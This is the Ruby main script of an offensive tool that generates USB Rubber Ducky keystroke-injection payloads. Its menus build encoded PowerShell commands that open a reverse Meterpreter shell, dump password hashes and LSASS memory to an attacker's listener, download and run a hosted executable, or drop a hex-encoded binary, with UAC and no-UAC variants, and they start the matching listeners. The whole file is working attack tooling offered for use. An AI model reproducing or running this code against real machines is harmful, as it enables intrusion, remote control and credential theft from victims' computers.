#!/usr/bin/env ruby
require_relative './lib/core'
require_relative './lib/menu'
require_relative './lib/server_setup'
require_relative './lib/powershell_commands'
require_relative './lib/ducky_setup'
include MainCommands
include MsfCommands
include Menu
include DuckySetUp
include PowershellCommands
def server(attack)
  @server_setup = ServerSetUp.new
  host = @server_setup.get_host
  if attack == 'hash_dump'
    port = @server_setup.get_port
    powershell_command = powershell_hash_dump(host,port)
    return host,port,powershell_command
  elsif attack == 'lsass_dump'
    port = @server_setup.get_port
    powershell_command1,powershell_command2 = powershell_lsass_dump(host,port)
    return host,port,powershell_command1,powershell_command2
  elsif attack == 'wget'
    file_path = [(get_input('Enter full path to executable: ') ), $stdin.gets.rstrip][1]
    file_name = file_path.split('/')[-1]
    random_name_answer = [(get_input('Would you like to randomize the file name?[yes/no] ') ), $stdin.gets.rstrip][1]
    if random_name_answer == 'yes'
      print_info("Creating Random Name!\n")
      random_name = random_name_gen
      #new_file_name = file_name.gsub(file_name,random_name)
      print_info("Copying #{file_name} to '/var/www/'\n")
      FileUtils.copy(file_path,"/var/www/#{random_name}")
      powershell_command = powershell_wget_powershell(host,random_name)
    else
      print_info("Copying #{file_name} to '/var/www/'\n")
      FileUtils.copy(file_path,"/var/www/#{file_name}")
      powershell_command = powershell_wget_powershell(host,file_name)
    end
    return powershell_command
  end
end
def hex_setup
  file_path = [(get_input('Enter full path to executable: ') ), $stdin.gets.rstrip][1]
  file_name = file_path.split('/')[-1]
  hex_setup if not File.exists?(file_name)
  hex_string = bin_to_hex(file_path)
  random_name_answer = [(get_input('Would you like to randomize the file name?[yes/no] ') ), $stdin.gets.rstrip][1]
  if random_name_answer == 'yes'
    print_info("Creating Random Name!\n")
    random_name = random_name_gen
    powershell_command = powershell_hex_to_bin(temp_path,"#{victim_path}#{random_name}")
  else
    powershell_command = powershell_hex_to_bin(temp_path,"#{victim_path}#{file_name}")
  end
  return powershell_command,hex_string
end
def meterpreter_setup     
  server_setup = ServerSetUp.new
  host = server_setup.get_host
  port = server_setup.get_port
  shellcode = generate_shellcode(host,port)
  powershell_command = powershell_reverse_meterpreter(shellcode)
  return powershell_command,host,port
end
def start_msf(host,port)
  msf = Readline.readline("#{get_input('Would you like to start the Metasploit Listener[yes/no]')} ", true)
  msf == 'yes' ? metasploit_setup(host,port) : print_info("Goody Bye!\n")
end
def start_hash_server(port)
  hash = Readline.readline("#{get_input('Would you like to start the listener[yes/no]')} ", true)
  hash == 'yes' ? @server_setup.hash_server(port) : print_info("Goody Bye!\n")
end
def start_lsass_server(port)
  lsass = Readline.readline("#{get_input('Would you like to start the listener[yes/no]')} ", true)
  lsass == 'yes' ? @server_setup.lsass_server(port) : print_info("Goody Bye!\n")
end
def case_main_menu
  answer = main_menu
  case answer
    when '1'
      case_reverse_meterpreter_menu
    when '2'
      case_dump_hashes_menu
    when '3'
      case_dump_lsass_menu
    when '4'
      case_wget_menu
    when '5'
      case_hex_to_bin_menu
    when '99'
      exit
    else
      print_error('Bad Choice')
      sleep(1)
      case_main_menu
  end
end
def case_reverse_meterpreter_menu
  reverse_meterpreter_answer = reverse_meterpreter_menu
  case reverse_meterpreter_answer
    when '1'
      powershell_command,host,port = meterpreter_setup
      print_info("Creating Text File!\n")
      ducky_meterpreter_uac(encode_command(powershell_command))
      compile_ducky(reverse_meterpreter_file)
      start_msf(host,port)
    when '2'
      powershell_command,host,port = meterpreter_setup
      print_info("Creating Text File!\n")
      ducky_meterpreter_no_uac(encode_command(powershell_command))
      compile_ducky(reverse_meterpreter_file)
      start_msf(host,port)
	  when '3'
      powershell_command,host,port = meterpreter_setup
      print_info("Creating Text File!\n")
      ducky_meterpreter_low(encode_command(powershell_command))
      compile_ducky(reverse_meterpreter_file)
      start_msf(host,port)
    when '99'
      case_main_menu
    else
      print_error('Bad Choice')
      sleep(1)
      case_reverse_meterpreter_menu
  end
end
def case_dump_hashes_menu
  attack = 'hash_dump'
  dump_hashes_answer = dump_hashes_menu
  case dump_hashes_answer
    when '1'
      host,port,powershell_command = server(attack)
      print_info("Creating Text File!\n")
      ducky_hash_dump_uac(encode_command(powershell_command))
      compile_ducky(hash_dump_file)
      start_hash_server(port)
    when '2'
      host,port,powershell_command = server(attack)
      print_info("Creating Text File!\n")
      ducky_hash_dump_no_uac(encode_command(powershell_command))
      compile_ducky(hash_dump_file)
      start_hash_server(port)
    when '99'
      case_main_menu
    else
      print_error('Bad Choice')
      sleep(1)
      case_dump_hashes_menu
  end
end
def case_dump_lsass_menu
  attack = 'lsass_dump'
  dump_lsass_answer = dump_lsass_menu
  case dump_lsass_answer
    when '1'
      host,port,powershell_command1,powershell_command2 = server(attack)
      print_info("Creating Text File!\n")
      ducky_lsass_uac(encode_command(powershell_command1),encode_command(powershell_command2))
      compile_ducky(lsass_dump_file)
      start_lsass_server(port)
    when '2'
      host,port,powershell_command1,powershell_command2 = server(attack)
      print_info("Creating Text File!\n")
      ducky_lsass_no_uac(encode_command(powershell_command1),encode_command(powershell_command2))
      compile_ducky(lsass_dump_file)
      start_lsass_server(port)
    when '99'
      case_main_menu
    else
      print_error('Bad Choice')
      sleep(1)
      case_dump_lsass_menu
  end 
end
def case_wget_menu
  attack = 'wget'
  ServerSetUp.new.web_server
  wget_answer = powershell_wget_menu
  case wget_answer
    when '1'
      powershell_command = server(attack)
      print_info("Creating Text File!\n")
      ducky_wget_uac(encode_command(powershell_command))
      compile_ducky(wget_file)
    when '2'
      powershell_command = server(attack)
      print_info("Creating Text File!\n")
      ducky_wget_no_uac(encode_command(powershell_command))
      compile_ducky(wget_file)
    when '3'
      powershell_command = server(attack)
      print_info("Creating Text File!\n")
      ducky_wget_low(encode_command(powershell_command))
      compile_ducky(wget_file)
    when '99'
      case_main_menu
    else
      print_error('Bad Choice')
      sleep(1)
      case_wget_menu
  end
end
def case_hex_to_bin_menu
  hex_answer = hex_to_bin_menu
  case hex_answer
    when '1'
      powershell_command,hex_string = hex_setup
      print_info("Creating Text File!\n")
      ducky_hex_uac(hex_string,encode_command(powershell_command))
      compile_ducky(hex_to_bin_file)
    when '2'
      powershell_command,hex_string = hex_setup
      print_info("Creating Text File!\n")
      ducky_hex_no_uac(hex_string,encode_command(powershell_command))
      compile_ducky(hex_to_bin_file)
    when '3'
      powershell_command,hex_string = hex_setup
      print_info("Creating Text File!\n")
      ducky_hex_low(hex_string,encode_command(powershell_command))
      compile_ducky(hex_to_bin_file)
    when '99'
      case_main_menu
    else
      print_error('Bad Choice')
      sleep(1)
      case_hex_to_bin_menu
  end
end
begin
  if Process.uid != 0
    print_info('Not Running as Root some payloads may not work properly')
    sleep(2)
  end
    case_main_menu
end